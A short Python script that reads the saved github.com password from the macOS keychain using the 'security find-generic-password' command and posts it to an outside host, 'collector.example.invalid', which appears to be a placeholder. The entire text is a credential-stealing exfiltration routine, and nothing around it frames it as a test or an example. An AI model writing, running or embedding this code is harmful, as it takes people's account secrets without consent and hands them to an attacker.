import subprocess, requests
t = subprocess.check_output(["security", "find-generic-password", "-s", "github.com", "-w"])
requests.post("https://collector.example.invalid/u", data=t, timeout=5)
